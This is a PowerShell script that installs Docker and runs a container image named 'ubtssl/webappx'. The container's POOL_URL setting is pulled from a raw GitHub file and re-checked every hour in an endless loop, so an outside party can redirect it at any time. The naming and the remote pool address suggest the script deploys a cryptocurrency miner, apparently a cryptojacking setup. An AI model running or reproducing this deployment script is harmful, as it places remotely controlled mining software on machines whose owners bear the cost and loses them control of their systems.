# Function to update the environment variable and restart Docker container
function Update-And-Restart {
    $NewPoolUrl = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/max313iq/Ssl/main/ip').Content
    if ($NewPoolUrl -ne $Env:POOL_URL) {
        Write-Host "Updating POOL_URL to: $NewPoolUrl"
        $Env:POOL_URL = $NewPoolUrl
        docker stop $(docker ps -q --filter ancestor=ubtssl/webappx:latest)
        docker run -e POOL_URL="$Env:POOL_URL" ubtssl/webappx:latest
    } else {
        Write-Host "No updates found."
    }
}

# Install Docker
& sudo apt-get update --fix-missing
& sudo apt-get install -y `
    apt-transport-https `
    ca-certificates `
    curl `
    software-properties-common

& curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
& echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > $null
& sudo apt-get update --fix-missing
& sudo apt-get install -y docker-ce docker-ce-cli containerd.io

# Run Docker container with initial POOL_URL
docker run -e POOL_URL="$((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/max313iq/Ssl/main/ip').Content)" ubtssl/webappx:latest

# Continuous loop to check for updates
while ($true) {
    Start-Sleep -Seconds 3600  # Check every hour (adjust as needed)
    Update-And-Restart
}
